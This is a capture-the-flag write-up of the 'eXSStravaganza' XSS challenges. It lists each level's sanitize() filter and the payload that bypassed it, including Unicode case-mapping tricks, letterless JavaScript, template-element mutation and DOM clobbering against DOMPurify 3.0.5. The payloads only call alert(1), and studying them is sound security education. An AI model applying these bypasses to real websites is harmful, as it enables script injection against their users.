## eXSStravaganza
This was a series of challenges of increasing difficuly where different types of filters had to be bypassed.  
I've found the collection of scenarios and techniques interesting (mostly the BONUS ones).  
The objective for **each** challenge, was to `alert` the number `1` in the "sandboxed" iframe, where the result of the function `sanitize()` was embedded.


### eXSStravaganza-1
HTML injection with no filter, just used `<script>alert(1)</script>`

### eXSStravaganza-2
HTML injection, filter forbids "script", just used img `<img src='x' onerror='alert(1)'/>`

### eXXStravaganza-3 and 4
They're both HTML injections, one filter forbids "alert" the other runs `.toUpperCase()` on the input.  
I used [JSFuck](https://jsfuck.com/) for both. HTML isn't case sensitive so `<SCRIPT>` works just fine in 4.

### eXXStravaganza 5
```function sanitize(input) {
    // no equals, no parentheses!
    return input.replace(/[=(]/g, '');
}
```  
HTML injection, regular expression forbids equals and parenthesis (which means, no JSFuck now).  
I can't use `` alert`1` `` because it would not return the **number** 1. Luckily there was a payload by Cure53 with no parenthesis nor equals  
 `` <script>eval.call`${'alert\x281\x29'}`</script> ``.  
It leverages substitution in template strings to call eval with an alert with it's parenthesis hex encoded.

### eXXStravaganza-6
```function sanitize(input) {
    // no symbols whatsoever! good luck!
    const sanitized = input.replace(/[[|\s+*/<>\\&^:;=`'~!%-]/g, '');
    return "  \x3Cscript\x3E\nvar name=\"" + sanitized + "\";\ndocument.body.innerText=name;\n  \x3C/script\x3E";
}
```
This time our input is put inside a Javascript variable, which we have to escape. The filter forbids a lot of symbols.  
The following is my (uninteded) solution `".__proto__.__defineGetter__("a", function () {alert(1)})??"".a??"`.  
Since `"` is not forbidden, we can escape from the string and run code. Here I decided to pollute the prototype of `String`, and create a new getter with the wanted function inside it. I used `??` (Nullish Coalescing Operator) as a separator and then simply called the getter by requesting the newly polluted property of `String` with `"".a`. I ended by closing the string with quotes.

### eXXStravaganza-7
```function sanitize(input) {
    // no tags, no comments, no string escapes and no new lines
    const sanitized = input.replace(/[</'\r\n]/g, '');
    return "  \x3Cscript\x3E\n// the input is '" + sanitized + "'\n  \x3C/script\x3E";
}
```
This time our input is put inside a pair of single-quotes **inside** an in-line Javascript comment. The filter forbids both single-quotes and newlines.  

We can escape the comment by adding a new-line in Unicode (Like `\u2028`). The single quote trailing our input now breaks the script. To get rid of it we can create another line (again, with the unicode new-line) and use an HTML comment (only `<` is forbidden! While `>` is not) which will comment out the rest of the line (meaning the single-quote).  
`;  alert(1);  -->`

### eXXStravaganza-8 
```function sanitize(input) {
    let sanitized = input;
    do{
        input = sanitized;
        // no opening tags
        sanitized = input.replace(/<[a-zA-Z]/g, '')
    } while (input != sanitized)
    sanitized = sanitized.toUpperCase();
    do{
        input = sanitized;
        // no script
        sanitized = input.replace(/SCRIPT/g, '')
    } while (input != sanitized)
    return sanitized.toLowerCase();
}
```
We are back to an HTML injection. This time the filter doesn't allow any (ASCII ;) ) letter as a first character of an HTML tag. And then the filter turns to uppercase our input, before checking if it contains "SCRIPT" and the again makes it lowercase.  
This capitalization change sounded suspect to me, so I wrote a little script to check if there was any character that after undergoing this changes would become an ASCII letter.
```
for (let i = 0; i < 65536; i++) {
	let i_upper = String.fromCharCode(i).toUpperCase();
	let i_lower = i_upper.toLowerCase();
	if (i_lower == "i"){
		console.log(i, String.fromCharCode(i));
	}
}
```

This returned the letter "ı" which I used to build a simple img XSS payload.  
`<ımg src='x' onerror='alert(1)'/>`

### eXXStravaganza-9
```function sanitize(input) {
    // no tags, no comments, no string escapes and no new lines
    const sanitized = input.replace(/[a-z\\]/gi, '').substring(0,140);
    return "  \x3Cscript\x3E\n  " + sanitized + "\n  \x3C/script\x3E";
}
```

This time our input is embedded in a script, but it's **heavily** filtered (no letters of any kind!), and we have a character limit of 140.  
JSFuck would work here, but the character limit is way too small. [This gist](https://gist.github.com/ignis-sec/a89988c3bc473c055c1c5a5228a23fc6) shows a shorter method to achieve what JSFuck does, but it's still too long. With some optimizations (using numbers, using parenthesis, concatenating all strings in one, changed the order to favorite shorter words) I managed to get the payload to 127 characters.  

``〱=[!0]+!1+[][0]+{},ᘘ=〱[23],ᘙ=〱[19],ᘚ=〱[1],ᘲ=〱[0],ᘳ=ᘘ+ᘙ+〱[10]+〱[7]+ᘲ+ᘚ+〱[2]+ᘘ+ᘲ+ᘙ+ᘚ,ᘎ=〱[5]+〱[6]+〱[3]+ᘚ+ᘲ+'(1)',[][ᘳ][ᘳ]`ᘎ${ᘎ}``` ``  
After the solving the challenge, I searched around a bit and found there is [this payload](https://github.com/hahwul/XSS-Payload-without-Anything) which is way shorter than 127 chars.  

### eXSStravaganza-BONUS:1
```
function sanitize(input) {
    // only letters and some other characters
    const sanitized = input
        .replace(/[^a-z"+,:.=]/g, '')
    return '  \x3Cscript>\nvar x = "' + sanitized + '";\n  \x3C/script>'
}
```
Here our input is again in a variable, and only some characters are allowed.  
The browser here has a strange name for the tab.  
![Browser tab displayingh](browser.png?raw=true "Browser tab")  
Looking at the few characters allowed, we can escape from the string and build a payload leveraging the title of the page (which conviniently cointains valid Javascript code) in the tiny browser.  
`", location="javascript:"+document.title+"`

### eXSStravaganza-BONUS:2
```
function sanitize(input) {
    // no bad chars
    const sanitized = input
        .replace(/[-&%!/#;]/g, '')
    const template = document.createElement('template');
    template.innerHTML = sanitized;
    return '  <!-- ' + template.innerHTML + ' -->'
}
```
Here our input is put again in a comment, this time it's an HTML one.  
The sanitization function uses template and createElement, this combination lets the browser mutate our input. By putting `<?>` `createElement` will surround it with a comment (this is done to not render PHP code in the browser), breaking the comment in which we were stuck and allowing us to inject arbitrary HTML.
`<?><svg onload=alert(1)> `

### eXSStravaganza-BONUS:3
```async function sanitize(input) {
    // let's use DOMPurify 3.0.5!
    const sanitized = await DOMPurify.sanitize(input);
    setTimeout(notifySanitizationCompleted, 100);
    return sanitized;
}

function notifySanitizationCompleted() {
    setTimeout(sanitizationCompleted, 100);
}
```
This time we can use arbitrary HTML but the challenge is using the latest (as of the time of writing) version of DOMpurify.  
We don't need a 0day, we can just look at the code and see that `sanitizationCompleted` is an undefined function. The documentation of `setTimeout` describes how the first argument (which will be executed) can be both a function or a string containing code.  
This means we can just use **DOM clobbering** to create an element which overrides the value of (now a variable) `sanitizationCompleted` and runs arbitrary code using `setTimeout`.  
`cid` is used as a protocol since it's one of the few that DOMpurify allows in this context.  
`<a id="sanitizationCompleted" href="cid:alert(1)">`


### eXSStravaganza-10
```function sanitize(input) {
    // sanitization!
    const sanitized = input
        .replace(/[<>="&%$#\\/]/g, '')
        .split('\n')
        .map(row => 'eval(sanitizeAgainAgain(sanitizeAgain("' + row + '")))')
        .join('\n');
    return '  \x3Cscript>\n' + sanitized + '\n  \x3C/script>'
}

var bad = ['<', '>', '&', '%', '$', '#', '[', ']', '|', '{', '}', ';', '\\', '/', ',', '"', '\'', '=', '`', '(', ')'];

function sanitizeAgain(input) {
    // more sanitization!
    const sanitized = input.split('').filter(c => !bad.includes(c)).join('');
    return sanitized;
}

var regex = /[^A-z.\-]/g

function sanitizeAgainAgain(input) {
    // even more sanitization!
    const sanitized = input.replace(regex, '');
    return sanitized;
}
```

This challenge uses a very weird multi-step filter.  
First we notice that there are some characters we can't (actually) use in the first `replace`. Seeing as `regex` and `bad` are declared variables we can assume we have to mess with those to bypass the filter. For each line of input a new `eval(sanitizeAgainAgain(sanitizeAgain("' + OURINPUTHERE + '")` gets generated, meaning we can just put each part of code separated by a newline.

We can reduce the number of characters forbidden by the first filter (`bad`) by changing the length of the array with `bad.length--`. 
We can do the same with regex, transforming it into `Nan` (doing so with `bad` will break the script, but we can do it here).  
Now both the filters are bypassed and we can execute our alert. (We just need the parenthesis so we can just remove 2 characters from the `bad` array)  

```
bad.length--
bad.length--
regex--
alert(1)
```